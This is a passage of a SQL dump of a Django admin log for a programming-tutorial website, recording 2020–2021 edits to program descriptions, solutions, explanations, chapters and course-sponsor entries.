Python',2,'[{\"changed\": {\"fields\": [\"post_body\", \"featured_image\"]}}]',9,1),(849,'2020-06-06 05:15:33.479409','2','Input and Output in Python',2,'[{\"changed\": {\"fields\": [\"post_body\"]}}]',9,1),(850,'2020-06-06 05:16:45.516796','2','Input and Output in Python',2,'[{\"changed\": {\"fields\": [\"post_body\"]}}]',9,1),(851,'2020-06-06 10:35:06.007923','15','Operators',2,'[{\"changed\": {\"fields\": [\"slug\"]}}]',12,1),(852,'2020-06-06 10:36:28.862650','25','Arrays',2,'[{\"changed\": {\"fields\": [\"slug\"]}}]',12,1),(853,'2020-06-06 10:36:44.253001','24','Looping Statements',2,'[{\"changed\": {\"fields\": [\"slug\"]}}]',12,1),(854,'2020-06-06 10:36:56.251085','23','Branching Statements',2,'[{\"changed\": {\"fields\": [\"slug\"]}}]',12,1),(855,'2020-06-06 10:37:06.693268','22','Operators',2,'[{\"changed\": {\"fields\": [\"slug\"]}}]',12,1),(856,'2020-06-06 10:37:20.037444','21','Language Basics',2,'[{\"changed\": {\"fields\": [\"slug\"]}}]',12,1),(857,'2020-06-06 10:37:35.738477','20','File Operations',2,'[{\"changed\": {\"fields\": [\"slug\"]}}]',12,1),(858,'2020-06-06 10:37:44.497589','19','Strings',2,'[{\"changed\": {\"fields\": [\"slug\"]}}]',12,1),(859,'2020-06-06 23:46:01.706466','855','Program object (855)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,1),(860,'2020-06-06 23:48:19.953740','854','Program object (854)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,1),(861,'2020-06-06 23:49:59.065605','853','Program object (853)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,1),(862,'2020-06-06 23:50:42.728651','852','Program object (852)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,1),(863,'2020-06-06 23:52:04.236929','851','Program object (851)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,1),(864,'2020-06-06 23:52:47.764063','850','Program object (850)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,1),(865,'2020-06-06 23:54:18.226443','849','Program object (849)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,1),(866,'2020-06-06 23:55:10.206009','848','Program object (848)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,1),(867,'2020-06-06 23:56:38.252898','847','Program object (847)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,1),(868,'2020-06-06 23:57:05.821159','846','Program object (846)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,1),(869,'2020-06-07 00:01:39.301066','844','Program object (844)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,1),(870,'2020-06-07 00:01:54.314603','843','Program object (843)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,1),(871,'2020-06-07 00:02:24.845295','845','Program object (845)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,1),(872,'2020-06-07 00:04:02.186852','865','Program object (865)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,1),(873,'2020-06-07 00:04:33.046637','866','Program object (866)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,1),(874,'2020-06-07 00:05:36.283821','856','Program object (856)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,1),(875,'2020-06-07 00:06:01.370020','857','Program object (857)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,1),(876,'2020-06-07 00:06:52.210049','858','Program object (858)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,1),(877,'2020-06-07 00:07:16.200954','859','Program object (859)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,1),(878,'2020-06-07 00:07:32.571054','860','Program object (860)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,1),(879,'2020-06-07 00:08:27.333280','861','Program object (861)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,1),(880,'2020-06-07 00:08:53.459451','862','Program object (862)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,1),(881,'2020-06-07 00:09:21.277198','863','Program object (863)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,1),(882,'2020-06-07 00:10:21.981871','864','Program object (864)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,1),(883,'2020-06-07 01:20:19.527328','2','Input and Output in Python',2,'[{\"changed\": {\"fields\": [\"post_body\"]}}]',9,1),(884,'2020-06-07 01:23:30.063060','1','Centroid based Text summarization in Python',2,'[{\"changed\": {\"fields\": [\"post_body\", \"featured_image\"]}}]',9,1),(885,'2020-06-08 09:20:55.066070','4','Logic Building in C',2,'[{\"changed\": {\"fields\": [\"course_title\"]}}]',8,1),(886,'2020-09-17 04:52:19.736774','7','Python Logic Building',1,'[{\"added\": {}}]',8,2),(887,'2020-09-17 04:56:09.392759','26','Problem Solving on Digits',1,'[{\"added\": {}}]',12,2),(888,'2020-09-17 05:09:37.742136','1055','Program object (1055)',1,'[{\"added\": {}}]',7,2),(889,'2020-09-17 05:14:38.734245','1055','Program object (1055)',2,'[{\"changed\": {\"fields\": [\"solution\", \"explanation\"]}}]',7,2),(890,'2020-09-17 05:15:23.671945','1055','Program object (1055)',2,'[{\"changed\": {\"fields\": [\"solution\"]}}]',7,2),(891,'2020-09-17 05:16:31.448893','1055','Program object (1055)',2,'[{\"changed\": {\"fields\": [\"solution\"]}}]',7,2),(892,'2020-09-21 04:27:35.268334','1055','Program object (1055)',2,'[{\"changed\": {\"fields\": [\"solution\"]}}]',7,2),(893,'2020-09-21 04:29:40.202470','26','Problem Solving in Digits',2,'[{\"changed\": {\"fields\": [\"chapter_title\", \"slug\"]}}]',12,2),(894,'2020-09-21 04:45:42.908982','1055','Program object (1055)',2,'[{\"changed\": {\"fields\": [\"program_title\", \"slug\"]}}]',7,2),(895,'2020-09-23 04:03:32.227911','1056','Program object (1056)',1,'[{\"added\": {}}]',7,2),(896,'2020-09-23 04:07:46.103956','1057','Program object (1057)',1,'[{\"added\": {}}]',7,2),(897,'2020-09-23 04:14:40.397049','1058','Program object (1058)',1,'[{\"added\": {}}]',7,2),(898,'2020-09-23 04:21:49.947903','1059','Program object (1059)',1,'[{\"added\": {}}]',7,2),(899,'2020-09-23 04:25:30.763970','1060','Program object (1060)',1,'[{\"added\": {}}]',7,2),(900,'2020-09-23 04:25:38.713137','1059','Program object (1059)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(901,'2020-09-23 04:29:16.403232','1059','Program object (1059)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(902,'2020-09-23 04:29:32.576636','1060','Program object (1060)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(903,'2020-09-23 04:29:54.847826','1058','Program object (1058)',2,'[]',7,2),(904,'2020-09-23 04:30:13.153696','1061','Program object (1061)',1,'[{\"added\": {}}]',7,2),(905,'2020-09-23 04:34:59.837469','1062','Program object (1062)',1,'[{\"added\": {}}]',7,2),(906,'2020-09-23 04:35:49.382590','1062','Program object (1062)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(907,'2020-09-23 04:35:58.089918','1059','Program object (1059)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(908,'2020-09-23 04:36:30.031589','1061','Program object (1061)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(909,'2020-09-23 04:36:41.280159','1060','Program object (1060)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(910,'2020-09-23 04:36:51.767815','1058','Program object (1058)',2,'[]',7,2),(911,'2020-09-23 04:37:08.331972','1057','Program object (1057)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(912,'2020-09-23 04:37:23.842712','1056','Program object (1056)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(913,'2020-09-23 04:37:33.155603','1055','Program object (1055)',2,'[]',7,2),(914,'2020-09-23 04:38:02.791367','1062','Program object (1062)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(915,'2020-09-23 04:38:16.676010','1061','Program object (1061)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(916,'2020-09-23 04:38:26.943707','1060','Program object (1060)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(917,'2020-09-23 04:39:56.471035','1059','Program object (1059)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(918,'2020-09-23 04:40:44.833007','1062','Program object (1062)',2,'[{\"changed\": {\"fields\": [\"solution\"]}}]',7,2),(919,'2020-09-30 01:02:10.556416','26','Digit Problems',2,'[{\"changed\": {\"fields\": [\"chapter_title\"]}}]',12,2),(920,'2020-09-30 01:05:06.691910','2','Python Tutorial',2,'[{\"changed\": {\"fields\": [\"blog_name\"]}}]',10,2),(921,'2021-01-05 08:24:54.234392','843','Program object (843)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,3),(922,'2021-01-05 08:25:37.068326','843','Program object (843)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,3),(923,'2021-01-05 08:28:23.649916','823','Program object (823)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,3),(924,'2021-01-05 08:30:25.657958','849','Program object (849)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,3),(925,'2021-01-05 08:31:33.855938','860','Program object (860)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,3),(926,'2021-01-05 08:34:52.379989','75','Program object (75)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,3),(927,'2021-01-05 08:35:09.838857','884','Program object (884)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,3),(928,'2021-01-05 08:35:41.854616','73','Program object (73)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,3),(929,'2021-01-05 08:36:07.883893','994','Program object (994)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,3),(930,'2021-01-05 08:42:34.987851','826','Program object (826)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,3),(931,'2021-05-17 12:10:28.092091','27','Step by Step Python Program for Guessing Game',1,'[{\"added\": {}}]',12,3),(932,'2021-05-17 12:15:19.130312','27','Step by Step Python Program for Guessing Game',2,'[{\"changed\": {\"fields\": [\"reference\"]}}]',12,3),(933,'2021-05-17 12:16:17.410144','27','Python Program for Guessing Game',2,'[{\"changed\": {\"fields\": [\"chapter_title\", \"slug\"]}}]',12,3),(934,'2021-05-17 12:44:51.453950','27','Python Program for Guessing Game',2,'[{\"changed\": {\"fields\": [\"reference\"]}}]',12,3),(935,'2021-05-17 13:23:45.003830','1063','Program object (1063)',1,'[{\"added\": {}}]',7,3),(936,'2021-05-17 13:25:55.304169','1063','Program object (1063)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,3),(937,'2021-05-17 13:38:21.153210','1064','Program object (1064)',1,'[{\"added\": {}}]',7,3),(938,'2021-05-17 13:54:19.973380','1065','Program object (1065)',1,'[{\"added\": {}}]',7,3),(939,'2021-05-17 14:26:09.940941','1066','Program object (1066)',1,'[{\"added\": {}}]',7,3),(940,'2021-05-17 14:26:34.289998','1065','Program object (1065)',2,'[{\"changed\": {\"fields\": [\"solution\"]}}]',7,3),(941,'2021-05-17 14:46:56.409749','1066','Program object (1066)',2,'[{\"changed\": {\"fields\": [\"solution\", \"explanation\"]}}]',7,3),(942,'2021-05-17 14:49:21.820762','27','Python Program for Guessing Game',2,'[{\"changed\": {\"fields\": [\"reference\"]}}]',12,3),(943,'2021-05-17 15:22:50.445919','1067','Program object (1067)',1,'[{\"added\": {}}]',7,3),(944,'2021-05-17 15:23:20.373943','1067','Program object (1067)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,3),(945,'2021-05-17 15:32:15.524030','1068','Program object (1068)',1,'[{\"added\": {}}]',7,3),(946,'2021-05-17 15:55:02.112215','1069','Program object (1069)',1,'[{\"added\": {}}]',7,3),(947,'2021-05-17 15:55:51.109198','1068','Program object (1068)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,3),(948,'2021-05-17 15:56:26.612811','1067','Program object (1067)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,3),(949,'2021-05-17 15:56:53.145077','1066','Program object (1066)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,3),(950,'2021-05-17 15:57:19.426158','1065','Program object (1065)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,3),(951,'2021-05-17 15:57:45.342985','1064','Program object (1064)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,3),(952,'2021-05-17 15:58:06.374600','1063','Program object (1063)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,3),(953,'2021-05-18 01:56:25.234614','7','Python Logic Building',2,'[{\"changed\": {\"fields\": [\"course_description\"]}}]',8,3),(954,'2021-05-18 02:40:52.066254','1063','Program object (1063)',2,'[{\"changed\": {\"fields\": [\"program_title\"]}}]',7,3),(955,'2021-05-18 02:41:53.551797','1064','Program object (1064)',2,'[{\"changed\": {\"fields\": [\"program_title\"]}}]',7,3),(956,'2021-05-18 02:42:28.641073','1065','Program object (1065)',2,'[{\"changed\": {\"fields\": [\"program_title\"]}}]',7,3),(957,'2021-05-18 02:43:10.276098','1066','Program object (1066)',2,'[{\"changed\": {\"fields\": [\"program_title\"]}}]',7,3),(958,'2021-05-18 02:43:38.374415','1067','Program object (1067)',2,'[{\"changed\": {\"fields\": [\"program_title\"]}}]',7,3),(959,'2021-05-18 02:43:55.027340','1066','Program object (1066)',2,'[{\"changed\": {\"fields\": [\"program_title\"]}}]',7,3),(960,'2021-05-18 02:45:58.502862','1069','Program object (1069)',2,'[{\"changed\": {\"fields\": [\"program_title\"]}}]',7,3),(961,'2021-05-18 02:47:09.087315','1068','Program object (1068)',2,'[{\"changed\": {\"fields\": [\"program_title\"]}}]',7,3),(962,'2021-05-18 02:48:15.447937','1067','Program object (1067)',2,'[{\"changed\": {\"fields\": [\"program_title\"]}}]',7,3),(963,'2021-08-16 13:41:48.332274','1','IBM',1,'[{\"added\": {}}]',21,2),(964,'2021-08-16 13:43:02.824552','2','Infosys',1,'[{\"added\": {}}]',21,2),(965,'2021-08-16 13:43:53.106760','3','Google',1,'[{\"added\": {}}]',21,2),(966,'2021-08-16 13:43:53.243102','4','Google',1,'[{\"added\": {}}]',21,2),(967,'2021-08-16 13:45:24.913671','5','IIT Bombay',1,'[{\"added\": {}}]',21,2),(968,'2021-08-16 13:45:45.666002','4','Google',3,'',21,2),(969,'2021-08-16 13:50:21.937750','1','Python for Data Science',1,'[{\"added\": {}}]',22,2),(970,'2021-08-16 13:52:21.719513','2','Data Analysis with Python',1,'[{\"added\": {}}]',22,2),(971,'2021-08-16 13:56:10.865524','5','IIT Bombay',3,'',21,2),(972,'2021-08-16 13:56:10.867652','3','Google',3,'',21,2),(973,'2021-08-16 13:56:10.868681','2','Infosys',3,'',21,2),(974,'2021-08-16 14:30:43.657913','6','Google',1,'[{\"added\": {}}]',21,2),(975,'2021-08-16 14:32:42.686977','3','Fundamentals of Digital Marketing',1,'[{\"added\": {}}]',22,2),(976,'2021-08-16 14:33:24.009740','3','Fundamentals of Digital Marketing',2,'[{\"changed\": {\"fields\": [\"sponsor\"]}}]',22,2),(977,'2021-08-16 14:36:30.472207','4','Understand the Basic of Code',1,'[{\"added\": {}}]',22,2),(978,'2021-08-16 14:38:27.330867','5','Machine Learning Crash Course',1,'[{\"added\": {}}]',22,2),(979,'2021-08-16 14:40:27.967054','5','Machine Learning Crash Course',2,'[{\"changed\": {\"fields\": [\"highlights\"]}}]',22,2),(980,'2021-08-16 14:41:28.496559','5','Machine Learning Crash Course',2,'[]',22,2),(981,'2021-08-16 14:42:34.698873','5','Machine Learning Crash Course',2,'[{\"changed\": {\"fields\": [\"highlights\"]}}]',22,2),(982,'2021-08-16 14:43:02.533370','5','Machine Learning Crash Course',2,'[{\"changed\": {\"fields\": [\"highlights\"]}}]',22,2),(983,'2021-08-17 09:31:51.343519','6','Google',2,'[{\"changed\": {\"fields\": [\"title\"]}}]',21,2),(984,'2021-08-17 09:32:06.666230','1','IBM',2,'[{\"changed\": {\"fields\": [\"title\"]}}]',21,2),(985,'2021-08-17 09:48:01.377582','6','Google',2,'[{\"changed\": {\"fields\": [\"image\"]}}]',21,2),(986,'2021-08-17 09:48:14.004675','1','IBM',2,'[{\"changed\": {\"fields\": [\"image\"]}}]',21,2),(987,'2021-08-17 12:23:23.642415','7','Infosys',1,'[{\"added\": {}}]',21,2),(988,'2021-08-17 12:24:05.722476','6','InfyTQ',1,'[{\"added\": {}}]',22,2),(989,'2021-08-17 12:25:17.499343','6','InfyTQ',2,'[{\"changed\": {\"fields\": [\"highlights\"]}}]',22,2),(990,'2021-08-17 12:29:48.369464','6','Google',2,'[{\"changed\": {\"fields\": [\"image\"]}}]',21,2),(991,'2021-08-17 14:54:31.999761','1069','Program object (1069)',2,'[{\"changed\": {\"fields\": [\"solution\"]}}]',7,2),(992,'2021-08-17 14:55:05.413442','1068','Program object (1068)',2,'[{\"changed\": {\"fields\": [\"solution\"]}}]',7,2),(993,'2021-08-17 14:55:19.932952','1067','Program object (1067)',2,'[{\"changed\": {\"fields\": [\"solution\"]}}]',7,2),(994,'2021-08-17 14:55:52.319909','1065','Program object (1065)',2,'[{\"changed\": {\"fields\": [\"solution\"]}}]',7,2),(995,'2021-08-17 14:56:00.266401','1063','Program object (1063)',2,'[{\"changed\": {\"fields\": [\"solution\"]}}]',7,2),(996,'2021-08-17 14:56:12.832761','1064','Program object (1064)',2,'[{\"changed\": {\"fields\": [\"solution\"]}}]',7,2),(997,'2021-09-17 09:55:13.989397','28','Factors Program in Python',1,'[{\"added\": {}}]',12,2),(998,'2021-09-17 10:09:26.366254','1070','Program object (1070)',1,'[{\"added\": {}}]',7,2),(999,'2021-09-17 10:59:34.428991','1071','Program object (1071)',1,'[{\"added\": {}}]',7,2),(1000,'2021-09-17 10:59:58.413031','1070','Program object (1070)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1001,'2021-09-17 11:01:09.642621','1071','Program object (1071)',2,'[{\"changed\": {\"fields\": [\"solution\", \"explanation\"]}}]',7,2),(1002,'2021-09-30 01:03:16.244160','1','letters4ramesh@gmail.com',3,'',23,2),(1003,'2021-10-01 00:35:14.532781','921','Program object (921)',2,'[{\"changed\": {\"fields\": [\"solution\", \"solution_path\", \"explanation\"]}}]',7,2),(1004,'2021-10-01 00:54:43.375496','925','Program object (925)',2,'[{\"changed\": {\"fields\": [\"solution_path\"]}}]',7,2),(1005,'2021-10-01 01:05:16.879874','999','Program object (999)',2,'[{\"changed\": {\"fields\": [\"solution_path\"]}}]',7,2),(1006,'2021-10-01 01:06:50.347704','1009','Program object (1009)',2,'[{\"changed\": {\"fields\": [\"solution_path\"]}}]',7,2),(1007,'2021-10-01 01:10:18.478976','1016','Program object (1016)',2,'[{\"changed\": {\"fields\": [\"solution_path\"]}}]',7,2),(1008,'2021-10-01 01:10:32.603028','1016','Program object (1016)',2,'[]',7,2),(1009,'2021-10-01 01:11:12.079743','1016','Program object (1016)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1010,'2021-10-01 01:12:48.756079','1025','Program object (1025)',2,'[{\"changed\": {\"fields\": [\"solution_path\"]}}]',7,2),(1011,'2021-10-01 01:15:22.407387','1032','Program object (1032)',2,'[{\"changed\": {\"fields\": [\"solution_path\"]}}]',7,2),(1012,'2021-10-01 01:16:12.221085','1033','Program object (1033)',2,'[{\"changed\": {\"fields\": [\"solution_path\"]}}]',7,2),(1013,'2021-10-01 01:16:53.262759','1034','Program object (1034)',2,'[{\"changed\": {\"fields\": [\"solution_path\"]}}]',7,2),(1014,'2021-10-01 01:19:27.576282','1035','Program object (1035)',2,'[{\"changed\": {\"fields\": [\"program_title\", \"slug\", \"solution_path\"]}}]',7,2),(1015,'2021-10-01 01:21:00.968226','1034','Program object (1034)',2,'[{\"changed\": {\"fields\": [\"program_title\", \"slug\"]}}]',7,2),(1016,'2021-10-01 01:21:52.545603','1039','Program object (1039)',2,'[{\"changed\": {\"fields\": [\"solution_path\"]}}]',7,2),(1017,'2021-10-01 01:22:06.012387','1038','Program object (1038)',2,'[{\"changed\": {\"fields\": [\"solution_path\"]}}]',7,2),(1018,'2021-10-01 01:22:55.844400','1039','Program object (1039)',2,'[{\"changed\": {\"fields\": [\"solution_path\"]}}]',7,2),(1019,'2021-10-01 01:23:30.982080','1040','Program object (1040)',2,'[{\"changed\": {\"fields\": [\"program_title\"]}}]',7,2),(1020,'2021-10-01 01:24:56.031396','1041','Program object (1041)',2,'[{\"changed\": {\"fields\": [\"solution_path\"]}}]',7,2),(1021,'2021-10-01 01:26:13.641613','1044','Program object (1044)',2,'[{\"changed\": {\"fields\": [\"program_description\"]}}]',7,2),(1022,'2021-10-01 01:28:48.160968','1052','Program object (1052)',2,'[{\"changed\": {\"fields\": [\"solution_path\"]}}]',7,2),(1023,'2021-10-05 02:37:13.190921','1072','Program object (1072)',1,'[{\"added\": {}}]',7,2),(1024,'2021-10-05 09:28:43.436940','1070','Program object (1070)',2,'[{\"changed\": {\"fields\": [\"featured_image\"]}}]',7,2),(1025,'2021-10-05 09:44:57.042755','1070','Program object (1070)',2,'[{\"changed\": {\"fields\": [\"featured_image\"]}}]',7,2),(1026,'2021-10-05 10:10:55.383113','1073','Program object (1073)',1,'[{\"added\": {}}]',7,2),(1027,'2021-10-05 11:14:06.746758','1070','Program object (1070)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1028,'2021-10-05 11:14:39.366385','1071','Program object (1071)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1029,'2021-10-05 11:15:47.325682','1070','Program object (1070)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1030,'2021-10-05 11:16:57.128253','1073','Program object (1073)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1031,'2021-10-05 11:17:11.797892','1070','Program object (1070)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1032,'2021-10-05 11:17:29.494134','1071','Program object (1071)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1033,'2021-10-05 11:26:17.887911','758','Program object (758)',2,'[{\"changed\": {\"fields\": [\"raptor_file\"]}}]',7,2),(1034,'2021-10-08 09:09:12.689402','986','Program object (986)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1035,'2021-10-08 09:32:58.707939','986','Program object (986)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1036,'2021-10-08 09:34:31.062866','985','Program object (985)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1037,'2021-10-08 09:41:12.528453','987','Program object (987)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1038,'2021-10-08 09:44:32.416652','988','Program object (988)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1039,'2021-10-08 09:45:16.933093','986','Program object (986)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1040,'2021-10-08 10:30:49.683654','988','Program object (988)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1041,'2021-10-08 10:32:26.047025','989','Program object (989)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1042,'2021-10-08 10:32:51.580583','989','Program object (989)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1043,'2021-10-08 10:40:00.549587','990','Program object (990)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1044,'2021-10-08 10:41:24.875749','990','Program object (990)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1045,'2021-10-08 10:47:38.744841','989','Program object (989)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1046,'2021-10-08 10:48:04.172558','990','Program object (990)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1047,'2021-10-08 10:57:31.506657','991','Program object (991)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1048,'2021-10-08 10:58:42.263596','992','Program object (992)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1049,'2021-10-08 11:03:16.455877','993','Program object (993)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1050,'2021-10-08 11:07:44.109593','994','Program object (994)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1051,'2021-10-08 11:08:21.811024','992','Program object (992)',2,'[]',7,2),(1052,'2021-10-08 11:31:41.502932','999','Program object (999)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1053,'2021-10-08 12:04:04.608257','1010','Program object (1010)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1054,'2021-10-08 12:07:14.650377','1014','Program object (1014)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1055,'2021-10-09 03:47:20.709007','1016','Program object (1016)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1056,'2021-10-09 03:49:21.501385','1016','Program object (1016)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1057,'2021-10-09 04:06:18.743918','1017','Program object (1017)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1058,'2021-10-09 04:17:36.418778','1018','Program object (1018)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1059,'2021-10-09 04:18:32.193853','1017','Program object (1017)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1060,'2021-10-09 04:19:16.885745','1018','Program object (1018)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1061,'2021-10-09 04:24:24.055428','1019','Program object (1019)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1062,'2021-10-09 04:40:52.184378','1020','Program object (1020)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1063,'2021-10-09 04:49:47.363203','1021','Program object (1021)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1064,'2021-10-09 05:25:08.477214','1022','Program object (1022)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1065,'2021-10-09 05:32:59.714198','1023','Program object (1023)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1066,'2021-10-09 05:38:01.331970','1024','Program object (1024)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1067,'2021-10-09 05:39:41.140911','1025','Program object (1025)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1068,'2021-10-09 10:17:48.855736','1028','Program object (1028)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1069,'2021-10-09 10:38:33.082741','1029','Program object (1029)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1070,'2021-10-09 10:44:59.400702','1030','Program object (1030)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1071,'2021-10-09 10:54:36.274669','1031','Program object (1031)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1072,'2021-10-09 11:06:14.920210','1032','Program object (1032)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1073,'2021-10-10 23:52:16.156678','1029','Program object (1029)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1074,'2021-10-10 23:56:29.272305','1029','Program object (1029)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1075,'2021-10-10 23:57:22.455367','1030','Program object (1030)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1076,'2021-10-10 23:58:14.539301','1029','Program object (1029)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1077,'2021-10-10 23:58:40.929826','1030','Program object (1030)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1078,'2021-10-11 00:03:15.009039','1031','Program object (1031)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1079,'2021-10-11 00:03:40.235053','1029','Program object (1029)',2,'[]',7,2),(1080,'2021-10-11 00:07:30.033840','1032','Program object (1032)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1081,'2021-10-11 00:43:07.123184','1033','Program object (1033)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1082,'2021-10-11 01:04:05.639293','1034','Program object (1034)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1083,'2021-10-11 01:06:07.952914','1034','Program object (1034)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1084,'2021-10-11 01:12:02.852667','1035','Program object (1035)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1085,'2021-10-11 01:12:41.623643','1034','Program object (1034)',2,'[{\"changed\": {\"fields\": [\"explanation\"]}}]',7,2),(1086,'2021-10-11 01:19:11.194922','1073','Program object (1073)',2,'[{\"changed\": {\"fields\": [\"solution\"]}}]',7,2),(1087,'2021-10-11 01:19:52.943785','1073','Program object (1073)',2,'[{\"changed\": {\"fields\": [\"solution\"]}}]',7,2),(1088,'2021-10-11 01:28:29.721388','1036','Program object (1036)',2,'[{\"changed\": {\"fields\": [\"solution_path\", 